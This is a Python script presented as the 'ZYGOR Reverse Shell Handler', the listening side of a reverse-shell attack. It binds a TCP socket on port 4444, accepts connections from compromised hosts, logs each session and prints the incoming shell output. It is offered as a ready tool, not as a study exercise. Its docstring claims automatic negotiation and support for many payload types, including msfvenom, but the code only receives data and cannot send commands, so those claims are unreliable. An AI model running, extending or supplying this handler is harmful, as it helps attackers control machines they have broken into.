          #!/usr/bin/env python3
          """
          ZYGOR Reverse Shell Handler
          Automatically negotiates and handles reverse shell connections.
          Supports: bash, python, php, nc, ncat, socat, powershell, msfvenom payloads.
          """
          import socket, threading, sys, os, subprocess, logging, json
          from datetime import datetime

          LOG_FILE = "/opt/zygor/logs/reverse_shell_sessions.log"
          logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                              format='%(asctime)s - %(message)s')

          class ReverseShellHandler:
              def __init__(self, lhost: str = "0.0.0.0", lport: int = 4444):
                  self.lhost = lhost
                  self.lport = lport
                  self.sessions = []

              def start_listener(self):
                  server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                  server.bind((self.lhost, self.lport))
                  server.listen(10)
                  print(f"[+] Reverse shell handler listening on {self.lhost}:{self.lport}")
                  while True:
                      client, addr = server.accept()
                      print(f"[+] Connection from {addr}")
                      logging.info(f"Connection from {addr}")
                      t = threading.Thread(target=self.handle_session, args=(client, addr))
                      t.daemon = True
                      t.start()

              def handle_session(self, client, addr):
                  session_id = f"{addr[0]}:{addr[1]}-{datetime.now().isoformat()}"
                  self.sessions.append(session_id)
                  try:
                      while True:
                          data = client.recv(4096)
                          if not data:
                              break
                          print(f"[{session_id}] {data.decode(errors='replace')}", end='')
                  except:
                      pass
                  finally:
                      client.close()
                      print(f"[-] Session {session_id} closed")
                      logging.info(f"Session {session_id} closed")

          if __name__ == '__main__':
              lhost = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
              lport = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
              handler = ReverseShellHandler(lhost, lport)
              try:
                  handler.start_listener()
              except KeyboardInterrupt:
                  print("\n[!] Handler stopped")
